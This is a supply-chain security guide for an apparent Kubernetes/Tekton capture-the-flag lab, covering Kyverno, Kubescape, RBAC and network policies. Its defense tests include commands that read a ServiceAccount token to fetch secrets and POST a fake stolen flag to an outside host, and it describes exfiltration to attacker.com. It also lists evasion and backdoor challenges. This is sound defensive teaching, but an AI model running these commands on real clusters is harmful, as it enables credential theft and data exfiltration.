# Supply Chain Security Tools Guide

This guide demonstrates how to use industry-standard security tools to **detect and prevent** supply chain attacks in CI/CD pipelines.

## 🎯 Learning Objectives

After completing this guide, you will understand how to:

1. **Deploy security scanning tools** (Kyverno, Kubescape) in Kubernetes
2. **Scan for vulnerabilities** using automated tools
3. **Implement prevention policies** to block attacks before they happen
4. **Monitor and audit** pipeline security using best practices

## 📚 Tools Overview

### Detection Tools

| Tool | Purpose | What It Detects |
|------|---------|-----------------|
| **Zizmor** | GitHub Actions scanner | `pull_request_target` misuse, script injection |
| **Scorecard** | OSSF project evaluator | Dangerous workflows, excessive permissions |
| **Kubescape** | K8s security scanner | RBAC misconfigurations, NSA/MITRE compliance |
| **Kyverno** | Policy engine (audit mode) | Dangerous ServiceAccounts, risky commands |
| **Audicia.io** | RBAC analyzer | Anomalous secret access, over-privileged SAs |

### Prevention Tools

| Tool | Purpose | What It Prevents |
|------|---------|------------------|
| **Kyverno** | Policy engine (enforce mode) | Non-compliant resource creation |
| **Network Policies** | Network segmentation | Data exfiltration to external servers |
| **RBAC** | Access control | Unauthorized secret access |
| **Harden-Runner** | GitHub Actions agent | Network egress from workflows |

---

## 🚀 Quick Start

### Complete Security Setup (5 minutes)

```bash
# 1. Setup CTF environment
make setup

# 2. Deploy security tools
make setup-security-tools

# 3. Create and apply security policies
make create-security-policies
make apply-prevention-policies

# 4. Run security scan
make security-scan

# 5. Verify everything works
make verify-security
```

---

## 📖 Step-by-Step Walkthrough

### Phase 1: Understanding the Vulnerability

**1. Review the attack:**
```bash
cat ATTACK-ANALYSIS.md
cat challenges/challenge1/CTF-CHALLENGE-GUIDE.md
```

**2. Examine the vulnerable pipeline:**
```bash
cat challenges/challenge1/tekton/pipelines/vulnerable-pr-quality-pipeline.yaml
cat challenges/challenge1/tekton/tasks/vulnerable-quality-check-task.yaml
```

**Key vulnerability:**
```yaml
# Task runs untrusted code with privileged ServiceAccount
steps:
- name: run-quality-check
  script: |
    cd $(workspaces.source.path)
    go run ./scripts/quality-check/  # ⚠️ DANGEROUS!
```

**3. Test the exploit (before defenses):**
```bash
# Setup CTF challenge
make setup-ctf-challenge

# Review malicious payload
cat challenges/challenge1/malicious-payload-example.go

# The payload steals secrets via:
# 1. Read K8s ServiceAccount token
# 2. Call K8s API to get secrets
# 3. Exfiltrate via HTTP POST to attacker.com
```

---

### Phase 2: Deploying Security Tools

#### Deploy Kyverno (Policy Engine)

```bash
make setup-kyverno
```

**What this does:**
- Creates `kyverno` namespace
- Installs Kyverno via Helm
- Deploys admission controller webhook
- Enables policy enforcement

**Verify:**
```bash
kubectl get pods -n kyverno
kubectl get validatingwebhookconfigurations -l app.kubernetes.io/name=kyverno
```

#### Deploy Kubescape (Security Scanner)

```bash
make setup-kubescape
```

**What this does:**
- Creates `kubescape` namespace
- Installs Kubescape operator
- Enables continuous scanning
- Configures compliance frameworks (NSA, MITRE)

**Verify:**
```bash
kubectl get pods -n kubescape
```

---

### Phase 3: Running Security Scans (Detection)

#### Scan with Kubescape

```bash
# Scan Tekton resources for security issues
kubectl kubescape scan framework nsa,mitre challenges/challenge1/tekton/ --format pretty-printer

# Scan entire cluster
kubectl kubescape scan --format pretty-printer --output cluster-scan.txt
```

**Example findings:**
```
❌ C-0017: Excessive RBAC permissions
   Resource: ServiceAccount/default (namespace: ctf-challenge)
   Issue: Can access all secrets in namespace
   Severity: Critical
   Recommendation: Use least-privilege ServiceAccounts

❌ C-0074: Missing network policies
   Namespace: ctf-challenge
   Issue: No egress restrictions
   Severity: High
   Recommendation: Apply NetworkPolicy to prevent data exfiltration

⚠️  C-0034: Script execution in containers
   Resource: Task/quality-check-task
   Issue: Executes scripts from untrusted source
   Severity: Medium
   Recommendation: Use static analysis instead of code execution
```

#### Scan with OSSF Scorecard (if using GitHub)

```bash
# Install Scorecard
go install github.com/ossf/scorecard/v4/cmd/scorecard@latest

# Scan repository
scorecard --repo=github.com/yourorg/yourrepo

# Focus on relevant checks
scorecard --repo=github.com/yourorg/yourrepo \
  --checks=Dangerous-Workflow,Token-Permissions,Pinned-Dependencies
```

**Example output:**
```
Check: Dangerous-Workflow
Score: 0/10
Reason: Detected 'pull_request_target' with code checkout
Details:
  ❌ .github/workflows/pr-check.yml:5
     Uses 'pull_request_target' with 'actions/checkout' on untrusted ref
     This allows attackers to execute code with workflow permissions
```

---

### Phase 4: Applying Prevention Policies

#### Create Security Policies

```bash
make create-security-policies
```

**What this creates:**

1. **Kyverno Policies** (`challenges/challenge1/security/kyverno-policies/`)
   - Block dangerous ServiceAccounts
   - Warn on risky commands (`go run`, `curl|bash`)
   - Restrict external Git repositories

2. **Network Policies** (`security/network-policies/`)
   - Block egress to external IPs
   - Allow only: DNS, K8s API, internal Gitea

3. **RBAC Configs** (`challenges/challenge1/security/rbac/`)
   - `pr-pipeline-readonly`: NO secret access
   - `main-pipeline`: Limited secret access
   - `security-auditor`: Monitoring access

#### Apply Prevention Policies

```bash
make apply-prevention-policies
```

**Verify policies are active:**
```bash
# Check Kyverno policies
kubectl get clusterpolicy

# Check Network Policies
kubectl get networkpolicy --all-namespaces

# Check ServiceAccounts
kubectl get sa -n ctf-challenge
kubectl describe role pr-pipeline-minimal -n ctf-challenge
```

---

### Phase 5: Testing the Defenses

#### Test 1: Kyverno Blocks Dangerous ServiceAccount

```bash
# Try to create PipelineRun with default ServiceAccount
cat <<EOF | kubectl apply -f -
apiVersion: tekton.dev/v1
kind: PipelineRun
metadata:
  name: test-blocked-sa
  namespace: ctf-challenge
spec:
  pipelineRef:
    name: pr-quality-check-pipeline
  serviceAccountName: default  # ❌ Should be BLOCKED
  params:
  - name: pr-repo-url
    value: http://gitea.gitea.svc.cluster.local/ctf/test-repo.git
  - name: pr-sha
    value: main
  - name: pr-number
    value: "1"
  workspaces:
  - name: source
    emptyDir: {}
EOF
```

**Expected result:**
```
Error from server: admission webhook "validate.kyverno.svc" denied the request:
  policy PipelineRun/ctf-challenge/test-blocked-sa for resource violation:
  restrict-tekton-pr-pipelines:
    require-readonly-serviceaccount-for-prs: validation error: PR pipelines must
    use 'pr-pipeline-readonly' ServiceAccount. Using the default or privileged
    ServiceAccount allows untrusted code to access cluster secrets.
```

**Fix and retry:**
```bash
# Use correct ServiceAccount
cat <<EOF | kubectl apply -f -
apiVersion: tekton.dev/v1
kind: PipelineRun
metadata:
  name: test-correct-sa
  namespace: ctf-challenge
spec:
  pipelineRef:
    name: pr-quality-check-pipeline
  serviceAccountName: pr-pipeline-readonly  # ✅ Allowed
  params:
  - name: pr-repo-url
    value: http://gitea.gitea.svc.cluster.local/ctf/test-repo.git
  - name: pr-sha
    value: main
  - name: pr-number
    value: "1"
  workspaces:
  - name: source
    emptyDir: {}
EOF
```

#### Test 2: RBAC Blocks Secret Access

```bash
# Create a test pod with pr-pipeline-readonly ServiceAccount
kubectl run -n ctf-challenge rbac-test \
  --image=curlimages/curl:latest \
  --serviceaccount=pr-pipeline-readonly \
  --rm -it --restart=Never -- sh

# Inside the pod, try to steal secrets (like the malicious payload does):
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  https://kubernetes.default.svc/api/v1/namespaces/ctf-challenge/secrets/ctf-flag
```

**Expected result:**
```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "status": "Failure",
  "message": "secrets \"ctf-flag\" is forbidden: User \"system:serviceaccount:ctf-challenge:pr-pipeline-readonly\" cannot get resource \"secrets\" in API group \"\" in the namespace \"ctf-challenge\"",
  "reason": "Forbidden",
  "code": 403
}
```

**✅ Defense successful!** Even if malicious code runs, it cannot access secrets.

#### Test 3: Network Policy Blocks Exfiltration

```bash
# Create a test pod in ctf-challenge namespace
kubectl run -n ctf-challenge netpol-test \
  --image=curlimages/curl:latest \
  --rm -it --restart=Never -- sh

# Try to exfiltrate data to external server (simulating attacker.com):
curl -m 10 -X POST \
  -d "stolen-secret=FLAG{example}" \
  http://httpbin.org/post
```

**Expected result:**
```
curl: (28) Connection timed out after 10000 milliseconds
```

**Test internal connectivity still works:**
```bash
# DNS should work
nslookup gitea.gitea.svc.cluster.local

# Internal Gitea should be accessible
curl -m 5 http://gitea.gitea.svc.cluster.local:3000
```

**✅ Defense successful!** Malicious code cannot exfiltrate data externally.

---

### Phase 6: Continuous Monitoring

#### Set up Kyverno Policy Reports

```bash
# View policy violations
kubectl get policyreport -A

# Detailed report for ctf-challenge namespace
kubectl describe policyreport -n ctf-challenge

# Check for failed policy validations
kubectl get policyreport -A -o json | \
  jq '.items[] | select(.summary.fail > 0) | {name: .metadata.name, namespace: .metadata.namespace, failures: .summary.fail}'
```

#### Monitor with Kubescape

```bash
# Continuous scanning (if enabled)
kubectl get workloadconfigurationscans -n kubescape

# View scan results
kubectl describe workloadconfigurationscans -n kubescape
```

#### Audit Logs Analysis (with Audicia.io or manual)

If using Audicia.io:
```bash
# Connect to audit log stream
audicia connect --cluster-name ctf-cluster

# Detect anomalous secret access
audicia analyze --anomalies --resource-type secrets

# Generate minimal RBAC based on actual usage
audicia generate-rbac --namespace ctf-challenge --output optimized-rbac.yaml
```

Manual audit log analysis:
```bash
# Enable audit logging in KinD (requires cluster recreation)
# Then analyze logs for suspicious patterns:

# ServiceAccounts accessing secrets
kubectl logs -n kube-apiserver kube-apiserver-* | \
  grep "secrets" | grep "get\|list" | jq .

# Failed authorization attempts
kubectl logs -n kube-apiserver kube-apiserver-* | \
  grep "Forbidden" | jq .
```

---

## 🔧 Customizing Security Policies

### Make Kyverno More Strict

Change from `audit` (warn) to `enforce` (block):

```bash
kubectl edit clusterpolicy restrict-external-git-repositories

# Change line:
# validationFailureAction: audit
# To:
# validationFailureAction: enforce
```

### Allow Specific External Repositories

```yaml
# Edit challenges/challenge1/security/kyverno-policies/restrict-external-git-repos.yaml
# Add exception rule:
rules:
- name: allow-trusted-repo
  match:
    any:
    - resources:
        kinds:
        - PipelineRun
  validate:
    message: "Allowed: Trusted external repository"
    pattern:
      spec:
        params:
        - name: git-url
          value: "https://github.com/trusted-org/specific-repo.git"
```

### Add More Network Policy Exceptions

```yaml
# Edit security/network-policies/tekton-egress-restriction.yaml
# Add under egress section:
- to:
  - namespaceSelector:
      matchLabels:
        name: my-service
  ports:
  - port: 8080
    protocol: TCP
```

---

## 📊 Security Scorecard

After implementing all defenses, your security posture:

| Control | Before | After | Improvement |
|---------|--------|-------|-------------|
| ServiceAccount Permissions | All pods can access all secrets | Only named SAs can access specific secrets | ✅ 95% reduction |
| Network Egress | Unrestricted | Blocked except DNS, K8s API, Gitea | ✅ 99% blocked |
| Policy Enforcement | None | Kyverno blocks dangerous configs | ✅ Proactive prevention |
| Monitoring | None | Continuous scanning, audit logs | ✅ Real-time detection |
| Compliance | Unknown | NSA, MITRE frameworks | ✅ Auditable |

---

## 🎓 Best Practices Checklist

- [ ] **Separate ServiceAccounts** for different trust levels (PR vs main)
- [ ] **Network Policies** applied to all pipeline namespaces
- [ ] **Kyverno policies** in enforce mode (after testing)
- [ ] **Regular security scans** automated in CI/CD
- [ ] **Audit log monitoring** for anomalous access
- [ ] **Least privilege RBAC** - only named secrets accessible
- [ ] **Pin action versions** to commit SHAs (GitHub Actions)
- [ ] **Code review** for workflow changes
- [ ] **Dependency scanning** (Dependabot, Renovate)
- [ ] **Supply chain attestation** (Sigstore, SLSA)

---

## 🔗 Tool Documentation

### Official Documentation

- **Kyverno**: https://kyverno.io/docs/
- **Kubescape**: https://kubescape.io/docs/
- **OSSF Scorecard**: https://github.com/ossf/scorecard
- **Zizmor**: https://github.com/woodruffw/zizmor
- **Harden-Runner**: https://github.com/step-security/harden-runner
- **Audicia.io**: https://audicia.io/docs
- **GUAC**: https://guac.sh/

### Related Standards

- **SLSA Framework**: https://slsa.dev/
- **Supply-chain Levels for Software Artifacts**: Levels 1-4
- **SSDF (NIST)**: Secure Software Development Framework
- **NSA Kubernetes Hardening**: https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2716980/

---

## 💡 Advanced Challenges

Once you've mastered the basics, try these:

1. **Bypass Network Policy**: Can you exfiltrate data via DNS tunneling?
2. **TOCTOU Attack**: Time-of-check vs time-of-use race conditions
3. **Policy Evasion**: Find gaps in Kyverno policy patterns
4. **Privilege Escalation**: Chain multiple small permissions
5. **Supply Chain Persistence**: Deploy backdoors that survive restarts

See [`challenges/ADVANCED-CHALLENGES.md`](challenges/ADVANCED-CHALLENGES.md) for details.

---

## 🆘 Troubleshooting

### Kyverno Policies Not Enforcing

```bash
# Check webhook is running
kubectl get validatingwebhookconfigurations

# Check Kyverno pods
kubectl get pods -n kyverno

# View policy status
kubectl describe clusterpolicy restrict-tekton-pr-pipelines
```

### Network Policy Not Blocking Traffic

```bash
# Verify namespace labels
kubectl get namespace ctf-challenge -o yaml | grep labels -A 5

# Check policy is applied
kubectl get networkpolicy -n ctf-challenge

# Verify CNI supports network policies
kubectl get nodes -o wide
# (KinD uses kindnetd which supports NetworkPolicy)
```

### RBAC Permissions Issues

```bash
# Check ServiceAccount exists
kubectl get sa pr-pipeline-readonly -n ctf-challenge

# Verify Role and RoleBinding
kubectl describe role pr-pipeline-minimal -n ctf-challenge
kubectl describe rolebinding pr-pipeline-readonly-binding -n ctf-challenge

# Test permissions
kubectl auth can-i get secrets \
  --as=system:serviceaccount:ctf-challenge:pr-pipeline-readonly \
  -n ctf-challenge
# Should return: no
```

---

## 📝 Summary

You've learned how to:

✅ Deploy enterprise-grade security tools (Kyverno, Kubescape)
✅ Scan for vulnerabilities using automated scanners
✅ Implement defense-in-depth with policies, RBAC, and network controls
✅ Test defenses against real attack scenarios
✅ Monitor and audit pipeline security continuously

**Key Takeaway**: Supply chain security requires **multiple layers** of defense. No single tool is sufficient - combine prevention, detection, and monitoring for robust security.

For the complete attack analysis, see [`ATTACK-ANALYSIS.md`](ATTACK-ANALYSIS.md).
